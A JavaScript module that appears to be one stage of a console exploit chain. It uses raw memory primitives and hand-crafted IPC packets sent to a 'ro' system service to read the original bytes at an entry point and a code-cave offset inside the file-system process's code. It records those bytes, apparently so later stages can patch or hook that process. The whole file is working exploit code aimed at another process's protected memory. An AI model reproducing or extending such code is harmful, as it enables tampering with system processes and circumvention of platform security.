import coreRuntime from "../src/core/runtime.mjs";

const {allocPage: allocPage, beginAllocationTracking: beginAllocationTracking, borrowThreadScheduling: borrowThreadScheduling, buildRawFrame: buildRawFrame, closeRawThread: closeRawThread, endAllocationTracking: endAllocationTracking, cmifReply: cmifReply, freeTrackedAllocations: freeTrackedAllocations, IPC_SEND_DISPATCHER: IPC_SEND_DISPATCHER, launchRawWorker: launchRawWorker, log: log, read8: read8, read32: read32, read64: read64, readFrameResult: readFrameResult, waitRawThread: waitRawThread, write32: write32, write64: write64} = coreRuntime;

const check = (ok, message) => {
    if (!ok) throw new Error("trace-read: " + message);
};

const TEXT_SIZE = 0x24e000n;

const ENTRY_OFF = 0xedb64n;

const CAVE_OFF = 0x24d100n;

export async function run() {
    const service = globalThis.civRoService;
    const process = globalThis.civRoFsProcessCopy;
    const pid = globalThis.civRoFsPid;
    const walk = globalThis.civHomeFsWalk;
    check(service?.handle && process?.handle && pid, "prerequisites unavailable (need ro-service-lookup, fs-pid)");
    check(walk?.code?.length, "run zz-home-fs-walk.mjs first");
    check(globalThis.civHomeBranchScan?.hits?.length === 0, "run zz-home-fs-branchscan.mjs first; it must report hits=0");
    const candidates = walk.code.filter(c => c.type === 3 && parseInt(c.perm, 16) & 4 && BigInt("0x" + c.size) >= TEXT_SIZE);
    check(candidates.length === 1, "text candidate not unique");
    const base = BigInt("0x" + candidates[0].base);
    const schedule = borrowThreadScheduling();
    check(schedule && schedule.priority > 0 && schedule.priority < 64 && schedule.core <= 7, "native worker schedule unavailable");
    const tracking = beginAllocationTracking();
    check(tracking, "allocation tracker busy");
    let pending = false;
    const packet = allocPage(8192);
    const output = allocPage(4096);
    const bulkRead = (source, size) => {
        for (let i = 0; i < 32; i++) write32(packet + BigInt(i * 4), 0n);
        write32(packet, (4 | 1 << 24) >>> 0);
        write32(packet + 4n, (14 | 2147483648) >>> 0);
        write32(packet + 8n, 2n);
        write32(packet + 12n, BigInt(process.handle));
        write32(packet + 16n, BigInt(size));
        write32(packet + 20n, output & 0xffffffffn);
        write32(packet + 24n, 1n | (output >> 36n & 7n) << 2n | (output >> 32n & 15n) << 28n);
        write32(packet + 32n, 0x49434653n);
        write32(packet + 40n, 0x524f0016n);
        write64(packet + 48n, BigInt(pid));
        write64(packet + 56n, source);
        write64(packet + 64n, BigInt(size));
        write64(packet + 72n, 0n);
        const frame = buildRawFrame([ {
            fn: IPC_SEND_DISPATCHER,
            args: [ BigInt(service.handle), packet, 0x1000n, 0n ]
        } ]);
        const worker = launchRawWorker(frame.frame, schedule);
        check(worker?.handle && worker.rc === 0 && worker.started, "IPC worker did not start");
        if (waitRawThread(worker.handle, 2000000000n) !== 0) {
            globalThis.civHomePendingTrace = {
                worker: worker,
                frame: frame,
                packet: packet,
                output: output,
                tracking: tracking
            };
            pending = true;
            throw new Error("read timed out; buffers retained");
        }
        const transport = Number(readFrameResult(frame.frame, 0)) >>> 0;
        closeRawThread(worker.handle);
        check(transport === 0, "transport=0x" + transport.toString(16));
        const reply = cmifReply(packet);
        check(reply.result === 0, "read failed at 0x" + source.toString(16) + ": 0x" + reply.result.toString(16));
        const bytes = [];
        for (let i = 0; i < size; i++) bytes.push(Number(read8(output + BigInt(i))));
        return bytes;
    };
    const hex = bytes => bytes.map(b => b.toString(16).padStart(2, "0")).join("");
    try {
        const entry = hex(bulkRead(base + ENTRY_OFF, 4));
        const cave = hex(bulkRead(base + CAVE_OFF, 8));
        globalThis.civHomeOriginals = Object.freeze({
            base: base.toString(),
            entry: entry,
            cave: cave
        });
        await log("ORIGINAL base=" + base.toString() + " entry+0xedb64=" + entry + " cave+0x24d100=" + cave + " (host: save this line durably, then send the ack)");
    } finally {
        if (!pending && endAllocationTracking(tracking)) freeTrackedAllocations(tracking);
    }
}
